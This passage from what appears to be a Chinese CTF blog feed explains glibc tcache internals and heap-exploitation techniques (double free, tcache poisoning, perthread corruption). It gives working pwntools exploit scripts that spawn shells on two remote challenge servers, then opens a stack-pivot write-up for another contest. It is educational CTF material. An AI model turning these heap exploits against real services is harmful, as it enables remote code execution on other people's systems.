tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>tcache_perthread_struct位于堆开头的位置，大小为0x250，counts数组用于存放每个bin中的chunk数量，entries数组则是用于存放64个bin的地址</p>
<h2 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2946*/</span></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_put函数用于将符合tcache bins条件的chunk放入对应的bin中，从第一句可以看出，放入tcache bin中的chunk与fast bin中不同的是，tcache存放的是chunk的mem，即用户使用的data区域，chunk的fd指针指向的也是mem地址</p>
<p>chunk的插入操作也是采用头插法，每插入一个记录chunk数量的count位+1</p>
<h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2958*/</span></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_get函数用于完成tcache bin中chunk的取出，通过源码可以看到和fast bin一样也是从头部开始取，即也是先入后出的链式结构</p>
<p>取出时会将对应bin中的count位减一</p>
<h1 id="与tcache-bin相关的利用思路"><a href="#与tcache-bin相关的利用思路" class="headerlink" title="与tcache bin相关的利用思路"></a>与tcache bin相关的利用思路</h1><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><h3 id="libc2-29以前"><a href="#libc2-29以前" class="headerlink" title="libc2.29以前"></a>libc2.29以前</h3><p>在libc2.29以前是没有对放入tcache bin中的chunk进行double free检查的，也就是说我们可以直接释放两次同一个堆块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/jlYQ5q"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100919728.jpg" alt="jlYQ5q.jpg"></a></p>
<p>同一个堆块被释放进tcache bin中</p>
<h3 id="libc2-29之后"><a href="#libc2-29之后" class="headerlink" title="libc2.29之后"></a>libc2.29之后</h3><p>libc2.29之后加入了key字段用于double free的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2904*/</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在_int_free()函数中会判断即将释放的堆块是否存在key字段指向tcache的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 4197*/</span></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>修改chunk的fd指针达到任意地址读写的目的，比fast bin attack更简单的是，tcache没有size字段的检查，也就是不需要伪造size字段</p>
<p>需要注意的是2.32加入下面宏定义对fd指针机进行异或操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_put和tcache_get分别用宏定义对fd进行的加密和解密，所以2.32开始伪造fd的时候需要进行相应的异或操作</p>
<h2 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h2><p>在2.23下我们可以直接释放一个属于unsorted bin大小的chunk用于泄露libc，有了tcache机制后，想要通过unsorted bin泄露libc的话就需要先填满对应tcache bin，再释放才能进入unsorted bin中，或者直接释放一个0x410大小的chunk(64位下)</p>
<h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>如果可以分配到tcache_perthread_strcut，我们就可以改写所有tcache bin中的count位和对应bin中的地址，填满count位让我们泄露libc变得更轻松，改写对应地址能将任意地址链入链表中到达任意地址读写的目的</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="VN2020-easyTHeap"><a href="#VN2020-easyTHeap" class="headerlink" title="VN2020 easyTHeap"></a>VN2020 easyTHeap</h2><p>libc2.27</p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><a href="https://imgtu.com/i/jAb62j"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100919690.jpg" alt="jAb62j.jpg"></a></p>
<p><a href="https://imgtu.com/i/jAbjZ6"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100919228.jpg" alt="jAbjZ6.jpg"></a></p>
<p>free之后指针没有置零，uaf，限制了free次数为3次</p>
<p><a href="https://imgtu.com/i/jAqZo8"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100919786.jpg" alt="jAqZo8.jpg"></a></p>
<p>只能申请7个堆块，最大为0x100</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>double free拿到tcache struct，将所有tcache的count位填满，再free一个unsorted bin大小的堆块即可泄露libc，至此free次数以用完</li>
<li>编辑tcache改几个链表头打malloc_hook即可</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27435</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span> - <span class="number">0x250</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#3 tcache</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)   <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - <span class="number">0x3EBC30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one = libcbase + <span class="number">0x4f322</span></span><br><span class="line">realloc = libcbase + <span class="number">0x98C30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(malloc_hook - <span class="number">0x13</span>) * <span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x40</span>)   <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">11</span>+ p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn2022-华东北赛区duck"><a href="#ciscn2022-华东北赛区duck" class="headerlink" title="ciscn2022 华东北赛区duck"></a>ciscn2022 华东北赛区duck</h2><p>2.34 uaf , 打environ泄露栈地址，覆盖返回地址为system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28060</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">96</span> - libc.sym[<span class="string">&#x27;main_arena&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sh = libcbase + <span class="number">0x1B4689</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2daa2</span></span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()               <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line">add()   <span class="comment">#14</span></span><br><span class="line">add()   <span class="comment">#15 environ</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x150</span>      <span class="comment">#ret_addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack - <span class="number">0x18</span> ^ key))</span><br><span class="line"></span><br><span class="line">add() <span class="comment">#16</span></span><br><span class="line">add()   <span class="comment">#17 ret_addr</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi) + p64(sh) + p64(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF X SU 三月春季挑战赛</title>
    <url>/2022/06/17/%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<p>2022DASCTF X SU 三月春季挑战赛pwn题复现</p>
<span id="more"></span>

<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p><a href="https://imgtu.com/i/Xb7qkd"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921791.jpg" alt="Xb7qkd.jpg"></a></p>
<p><a href="https://imgtu.com/i/XLCrEn"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921435.jpg" alt="XLCrEn.jpg"></a></p>
<p>刚好能溢出到返回地址</p>
<p><a href="https://imgtu.com/i/XLCLvD"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921685.jpg" alt="XLCLvD.jpg"></a></p>
<p>返回地址填这里然后控制一下rbp的值就能实现任意地址写</p>
<p>第一次read使程序返回到该处进行第二次read</p>
<p>第二次read向bss段读入构造rop链，利用__do_global_dtors_aux中的一个magic gadget<code>: </code>add [rbp-3Dh], ebx;nop;ret;将setvbuf的got表改成puts泄露libc，再次返回到read处构造system(“&#x2F;bin&#x2F;sh”)，再次栈迁移执行getshell</p>
<p>exp</p>
